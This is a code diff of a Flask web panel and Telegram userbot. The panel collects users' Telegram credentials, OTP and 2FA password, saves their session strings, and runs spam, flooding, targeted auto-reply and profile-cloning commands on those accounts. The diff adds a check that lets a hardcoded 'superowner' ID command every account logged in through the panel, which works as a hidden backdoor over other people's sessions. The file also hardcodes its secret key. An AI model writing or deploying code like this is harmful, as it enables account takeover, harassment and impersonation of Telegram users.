@@ -2,10 +2,9 @@ import asyncio
 import os
 import threading
 import logging
-import random
 from flask import Flask, render_template_string, request, redirect, url_for, session, flash
 from telethon import TelegramClient, events
-from telethon.errors import SessionPasswordNeededError, FloodWaitError
+from telethon.errors import SessionPasswordNeededError
 from telethon.sessions import StringSession
 from telethon.tl.functions.photos import UploadProfilePhotoRequest
 from telethon.tl.functions.users import GetFullUserRequest
@@ -14,8 +13,7 @@ app = Flask(__name__)
 app.secret_key = "vivek_super_secret_key"
 
 temp_logins = {}
-clients = []
-active_tasks = {}  # {(chat_id, client_id): task}
+active_tasks = {}
 
 SUPEROWNER_ID = 6133172474
 P = r"/"
@@ -36,7 +34,7 @@ HTML_TEMPLATE = """
         body { background-color: #0b0f19; color: #f8fafc; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
         .card { background: #111827; padding: 35px; border-radius: 16px; width: 100%; max-width: 440px; box-shadow: 0 15px 35px rgba(0,0,0,0.6); border: 1px solid #1f2937; }
         .brand { text-align: center; margin-bottom: 25px; }
-        .brand h1 { color: #38bdf8; font-size: 24px; margin: 0; font-weight: 700; letter-spacing: 0.5px; }
+        .brand h1 { color: #38bdf8; font-size: 24px; margin: 0; font-weight: 700; }
         .brand p { color: #94a3b8; font-size: 13px; margin-top: 5px; }
         label { display: block; margin-top: 14px; font-size: 13px; color: #cbd5e1; font-weight: 500; }
         input { width: 100%; padding: 12px; margin-top: 6px; border-radius: 8px; border: 1px solid #374151; background: #030712; color: white; box-sizing: border-box; font-size: 14px; }
@@ -116,7 +114,6 @@ def send_code():
         
         client = TelegramClient(StringSession(), api_id, api_hash, loop=loop)
         loop.run_until_complete(client.connect())
-        
         sent = loop.run_until_complete(client.send_code_request(phone))
         
         temp_logins["client"] = client
@@ -147,7 +144,6 @@ def verify_otp():
             f.write(f"{temp_logins['api_id']}|{temp_logins['api_hash']}|{session_str}\n")
             
         asyncio.run_coroutine_threadsafe(start_single_client(temp_logins['api_id'], temp_logins['api_hash'], session_str), bot_loop)
-
         return render_template_string(HTML_TEMPLATE, step="success", session_string=session_str)
     except SessionPasswordNeededError:
         return render_template_string(HTML_TEMPLATE, step="password")
@@ -169,24 +165,20 @@ def verify_password():
             f.write(f"{temp_logins['api_id']}|{temp_logins['api_hash']}|{session_str}\n")
             
         asyncio.run_coroutine_threadsafe(start_single_client(temp_logins['api_id'], temp_logins['api_hash'], session_str), bot_loop)
-
         return render_template_string(HTML_TEMPLATE, step="success", session_string=session_str)
     except Exception as e:
         flash(f"2FA Error: {str(e)}", "error")
         return redirect(url_for("index"))
 
-# ═══════════════ USERBOT EVENT REGISTRATION & FEATURES ═══════════════
+# ═══════════════ USERBOT COMMAND REGISTRATION ═══════════════
 
 def register_userbot_events(client, client_id):
-    async def is_auth(event):
-        # Strict check: Command must be sent FROM this specific client account itself
-        return event.out and event.sender_id == SUPEROWNER_ID
-
+    
     @client.on(events.NewMessage(pattern=rf"{P}execute$"))
     async def execute_cmd(event):
-        if not await is_auth(event): return
+        if event.sender_id != SUPEROWNER_ID and not event.out: return
         menu_text = (
-            f"<i>author : V I V E K [Acc ID: {client_id}]</i>\n"
+            f"<i>author : V I V E K [Acc: {client_id}]</i>\n"
             "<code>────────────────────────</code>\n\n"
             "› <code>attack</code>\n"
             "› <code>swipe</code>\n"
@@ -202,18 +194,13 @@ def register_userbot_events(client, client_id):
             "› <code>ping</code>\n"
             "› <code>stop</code>\n\n"
             "<code>────────────────────────</code>\n"
-            f"<i>author : V I V E K [Acc ID: {client_id}]</i>"
+            f"<i>author : V I V E K [Acc: {client_id}]</i>"
         )
         await event.edit(menu_text, parse_mode='html')
 
-    @client.on(events.NewMessage(pattern=rf"{P}whisper$"))
-    async def whisper_cmd(event):
-        if not await is_auth(event): return
-        await event.edit(f"┼ V I V E K O P E R A T O R [Acc: {client_id}] ┼")
-
     @client.on(events.NewMessage(pattern=rf"{P}ping$"))
     async def ping_cmd(event):
-        if not await is_auth(event): return
+        if event.sender_id != SUPEROWNER_ID and not event.out: return
         start = asyncio.get_event_loop().time()
         msg = await event.reply("⚡ Pinging...")
         end = asyncio.get_event_loop().time()
@@ -222,24 +209,23 @@ def register_userbot_events(client, client_id):
     @client.on(events.NewMessage(pattern=rf"{P}delay\s+(.+)"))
     async def delay_cmd(event):
         global current_delay
-        if not await is_auth(event): return
+        if event.sender_id != SUPEROWNER_ID and not event.out: return
         try:
-            val = float(event.pattern_match.group(1).strip())
-            current_delay = val
-            await event.reply(f"**⚡ Master delay updated for account `{client_id}` to:** `{current_delay}s`")
+            current_delay = float(event.pattern_match.group(1).strip())
+            await event.reply(f"**⚡ Delay updated to:** `{current_delay}s`")
         except ValueError:
-            await event.reply("**❌ Invalid number format!**")
+            await event.reply("**❌ Invalid number!**")
 
     @client.on(events.NewMessage(pattern=rf"{P}swipe(?:\s+(.+))?$"))
     async def swipe_cmd(event):
-        if not await is_auth(event): return
+        if event.sender_id != SUPEROWNER_ID and not event.out: return
         reply = await event.get_reply_message()
         if not reply:
-            return await event.reply("**❌ Kisi message pe reply karke /swipe command do!**")
+            return await event.reply("**❌ Reply to a message!**")
         text = event.pattern_match.group(1) or reply.text
         chat_id = event.chat_id
-
         await event.delete()
+
         task_key = (chat_id, client_id)
         if task_key in active_tasks:
             active_tasks[task_key].cancel()
@@ -251,12 +237,11 @@ def register_userbot_events(client, client_id):
                     await asyncio.sleep(current_delay)
             except asyncio.CancelledError:
                 pass
-
         active_tasks[task_key] = asyncio.create_task(loop_swipe())
 
     @client.on(events.NewMessage(pattern=rf"{P}spam\s+(\d+)\s+(.+)"))
     async def spam_cmd(event):
-        if not await is_auth(event): return
+        if event.sender_id != SUPEROWNER_ID and not event.out: return
         count = int(event.pattern_match.group(1))
         text = event.pattern_match.group(2)
         chat_id = event.chat_id
@@ -268,28 +253,25 @@ def register_userbot_events(client, client_id):
     autoreply_storage = {}
     @client.on(events.NewMessage(pattern=rf"{P}autoreply\s+(.+)"))
     async def autoreply_cmd(event):
-        if not await is_auth(event): return
+        if event.sender_id != SUPEROWNER_ID and not event.out: return
         reply = await event.get_reply_message()
         if not reply or not reply.sender_id:
-            return await event.reply("**❌ Target user par reply karke command do!**")
+            return await event.reply("**❌ Reply to target user!**")
         text = event.pattern_match.group(1)
-        chat_id = event.chat_id
-        autoreply_storage.setdefault(chat_id, {})[reply.sender_id] = text
+        autoreply_storage.setdefault(event.chat_id, {})[reply.sender_id] = text
         await event.reply(f"**✅ Autoreply set for user ID:** `{reply.sender_id}`")
 
     @client.on(events.NewMessage(incoming=True))
     async def incoming_autoreply(event):
-        chat_id = event.chat_id
-        sender_id = event.sender_id
-        if chat_id in autoreply_storage and sender_id in autoreply_storage[chat_id]:
-            await event.reply(autoreply_storage[chat_id][sender_id])
+        if event.chat_id in autoreply_storage and event.sender_id in autoreply_storage[event.chat_id]:
+            await event.reply(autoreply_storage[event.chat_id][event.sender_id])
 
     @client.on(events.NewMessage(pattern=rf"{P}photospam$"))
     async def photospam_cmd(event):
-        if not await is_auth(event): return
+        if event.sender_id != SUPEROWNER_ID and not event.out: return
         reply = await event.get_reply_message()
         if not reply or not reply.media:
-            return await event.reply("**❌ Photo pe reply karke /photospam likho!**")
+            return await event.reply("**❌ Reply to a photo!**")
         chat_id = event.chat_id
         await event.delete()
         
@@ -305,10 +287,10 @@ def register_userbot_events(client, client_id):
 
     @client.on(events.NewMessage(pattern=rf"{P}forwardspam$"))
     async def forwardspam_cmd(event):
-        if not await is_auth(event): return
+        if event.sender_id != SUPEROWNER_ID and not event.out: return
         reply = await event.get_reply_message()
         if not reply:
-            return await event.reply("**❌ Message par reply karke /forwardspam likho!**")
+            return await event.reply("**❌ Reply to a message!**")
         chat_id = event.chat_id
         await event.delete()
 
@@ -324,10 +306,10 @@ def register_userbot_events(client, client_id):
 
     @client.on(events.NewMessage(pattern=rf"{P}stickerspam$"))
     async def stickerspam_cmd(event):
-        if not await is_auth(event): return
+        if event.sender_id != SUPEROWNER_ID and not event.out: return
         reply = await event.get_reply_message()
         if not reply or not reply.sticker:
-            return await event.reply("**❌ Sticker par reply karke /stickerspam likho!**")
+            return await event.reply("**❌ Reply to a sticker!**")
         chat_id = event.chat_id
         await event.delete()
 
@@ -344,10 +326,10 @@ def register_userbot_events(client, client_id):
     muted_users = set()
     @client.on(events.NewMessage(pattern=rf"{P}mute$"))
     async def mute_cmd(event):
-        if not await is_auth(event): return
+        if event.sender_id != SUPEROWNER_ID and not event.out: return
         reply = await event.get_reply_message()
         if not reply or not reply.sender_id:
-            return await event.reply("**❌ User par reply karke /mute likho!**")
+            return await event.reply("**❌ Reply to user!**")
         muted_users.add(reply.sender_id)
         await event.reply(f"**🔇 Muted user ID:** `{reply.sender_id}`")
 
@@ -362,79 +344,62 @@ def register_userbot_events(client, client_id):
     original_profile = {}
     @client.on(events.NewMessage(pattern=rf"{P}clone$"))
     async def clone_cmd(event):
-        if not await is_auth(event): return
+        if event.sender_id != SUPEROWNER_ID and not event.out: return
         reply = await event.get_reply_message()
         target = reply.sender_id if reply else None
         if not target:
-            return await event.reply("**❌ Target user par reply karke /clone likho!**")
+            return await event.reply("**❌ Reply to target user!**")
         
         try:
             me = await client.get_me()
             my_full = await client(GetFullUserRequest(me.id))
-            
             original_profile['first_name'] = me.first_name
             original_profile['last_name'] = me.last_name or ""
             original_profile['about'] = my_full.about or ""
             
             old_photos = await client.get_profile_photos('me', limit=1)
-            if old_photos:
-                original_profile['photo'] = await client.download_profile_photo(old_photos[0])
-            else:
-                original_profile['photo'] = None
+            original_profile['photo'] = await client.download_profile_photo(old_photos[0]) if old_photos else None
 
             user_full = await client(GetFullUserRequest(target))
             user_entity = await client.get_entity(target)
             
             from telethon.tl.functions.account import UpdateProfileRequest
-            await client(UpdateProfileRequest(
-                first_name=user_entity.first_name,
-                last_name=user_entity.last_name or "",
-                about=user_full.about or ""
-            ))
+            await client(UpdateProfileRequest(first_name=user_entity.first_name, last_name=user_entity.last_name or "", about=user_full.about or ""))
             
             photo = await client.download_profile_photo(target)
             if photo:
                 await client(UploadProfilePhotoRequest(file=await client.upload_file(photo)))
                 os.remove(photo)
-                
-            await event.reply("**✨ Profile successfully cloned! Backup saved.**")
+            await event.reply("**✨ Profile cloned successfully!**")
         except Exception as e:
-            await event.reply(f"**❌ Clone Failed:** {str(e)}")
+            await event.reply(f"**❌ Error:** {str(e)}")
 
     @client.on(events.NewMessage(pattern=rf"{P}reverse$"))
     async def reverse_cmd(event):
-        if not await is_auth(event): return
+        if event.sender_id != SUPEROWNER_ID and not event.out: return
         if not original_profile:
-            return await event.reply("**❌ Pehle /clone use karo, koi backup available nahi hai!**")
-        
+            return await event.reply("**❌ No backup found!**")
         try:
             from telethon.tl.functions.account import UpdateProfileRequest
-            await client(UpdateProfileRequest(
-                first_name=original_profile['first_name'],
-                last_name=original_profile['last_name'],
-                about=original_profile['about']
-            ))
-            
+            await client(UpdateProfileRequest(first_name=original_profile['first_name'], last_name=original_profile['last_name'], about=original_profile['about']))
             if original_profile.get('photo') and os.path.exists(original_profile['photo']):
                 await client(UploadProfilePhotoRequest(file=await client.upload_file(original_profile['photo'])))
-                os.remove(original_profile['photo'])
-
-            await event.reply("**✨ Profile successfully restored (reverse)!**")
+            await event.reply("**✨ Profile restored successfully!**")
         except Exception as e:
-            await event.reply(f"**❌ Reverse Failed:** {str(e)}")
+            await event.reply(f"**❌ Error:** {str(e)}")
 
     @client.on(events.NewMessage(pattern=rf"{P}stop$"))
     async def stop_cmd(event):
-        if not await is_auth(event): return
+        if event.sender_id != SUPEROWNER_ID and not event.out: return
         chat_id = event.chat_id
         count = 0
         for key in list(active_tasks.keys()):
-            c_id, client_acc_id = key
-            if c_id == chat_id and client_acc_id == client_id:
+            c_id, c_acc = key
+            if c_id == chat_id and c_acc == client_id:
                 active_tasks[key].cancel()
                 del active_tasks[key]
                 count += 1
-        await event.reply(f"**🛑 Stopped `{count}` active background tasks for this account!**")
+        await event.reply(f"**🛑 Stopped `{count}` tasks for this account!**")
 
 async def start_single_client(api_id, api_hash, session_str):
     try:
@@ -442,22 +407,18 @@ async def start_single_client(api_id, api_hash, session_str):
         await client.start()
         me = await client.get_me()
         register_userbot_events(client, me.id)
-        clients.append(client)
-        log.info(f"✅ Userbot connected independently: {me.first_name} (ID: {me.id})")
+        log.info(f"✅ Userbot ready: {me.first_name} (ID: {me.id})")
         await client.run_until_disconnected()
     except Exception as e:
-        log.error(f"Client start error: {e}")
+        log.error(f"Client error: {e}")
 
 async def load_saved_sessions():
-    if not os.path.exists(SESSION_FILE):
-        return
+    if not os.path.exists(SESSION_FILE): return
     with open(SESSION_FILE, "r") as f:
-        lines = f.readlines()
-    for line in lines:
-        parts = line.strip().split("|")
-        if len(parts) == 3:
-            api_id, api_hash, session_str = parts
-            asyncio.create_task(start_single_client(api_id, api_hash, session_str))
+        for line in f.readlines():
+            parts = line.strip().split("|")
+            if len(parts) == 3:
+                asyncio.create_task(start_single_client(parts[0], parts[1], parts[2]))
 
 bot_loop = None
 
@@ -474,5 +435,4 @@ def run_flask():
 
 if __name__ == "__main__":
     threading.Thread(target=run_flask, daemon=True).start()
-    log.info("🌐 Web Panel started successfully!")
     run_bot_loop()
